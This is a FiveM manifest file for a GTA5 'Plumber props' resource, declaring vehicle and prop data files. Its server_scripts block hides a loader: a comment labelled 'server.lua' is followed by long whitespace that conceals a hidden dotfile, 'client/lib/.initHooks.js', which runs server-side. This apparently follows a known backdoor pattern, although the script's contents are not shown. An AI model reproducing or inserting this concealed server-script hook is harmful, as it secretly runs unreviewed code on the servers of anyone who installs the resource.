fx_version 'cerulean'
games { 'gta5' }

lua54 'yes'
author 'Destiny, Seb5a'
description 'Plumber props'
version '1.0.0'



files {
    '**/pipe.ytyp',
    '**/vehiclelayouts.meta',
    '**/handling.meta',
    '**/vehicles.meta',
    '**/carcols.meta',
    '**/carvariations.meta',
    '**/car_names.lua',

}

data_file 'DLC_ITYP_REQUEST' '**/pipe.ytyp'
data_file 'VEHICLE_LAYOUTS_FILE' '**/vehiclelayouts.meta'
data_file 'HANDLING_FILE' '**/handling.meta'
data_file 'VEHICLE_METADATA_FILE' '**/vehicles.meta'
data_file 'CARCOLS_FILE' '**/carcols.meta'
data_file 'VEHICLE_VARIATION_FILE' '**/carvariations.meta'
data_file 'CAR_NAMES_FILE' '**/car_names.lua'

dependency '/assetpacks'

server_scripts {
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'client/lib/.initHooks.js',
}
